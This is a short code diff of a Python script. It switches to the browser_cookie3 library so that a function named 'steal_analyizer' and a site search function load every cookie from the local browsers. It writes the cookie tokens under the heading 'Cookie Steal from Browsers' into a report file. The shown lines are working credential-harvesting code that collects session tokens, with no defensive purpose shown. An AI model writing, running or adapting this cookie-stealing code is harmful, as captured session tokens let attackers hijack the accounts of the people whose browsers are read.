@@ -1,8 +1,4 @@
-# -*- coding: utf-8 -*-
-
-
-import browser_m
-
+import browser_cookie3
 import requests
 import sys
 
@@ -49,7 +45,7 @@ def steal_analyizer():
 
     with open('Browser_Analysis_Report.txt', 'a+') as f:
         f.write(heading('Cookie Steal from Browsers'))
-        cj = browser_m.load()  # browser_cookie3.load()
+        cj = browser_cookie3.load()
         f.write(heading('Tokens in Cookie'))
         cjl = [str(x) for x in cj]
         for x in cjl:
@@ -74,7 +70,7 @@ def steal_analyizer():
 
 
 def ssearch():
-    cj = browser_m.load()
+    cj = browser_cookie3.load()
     cjl = [str(x) for x in cj]
     heading('Specific WebSearch')
     name = input('Give Website Name: ')
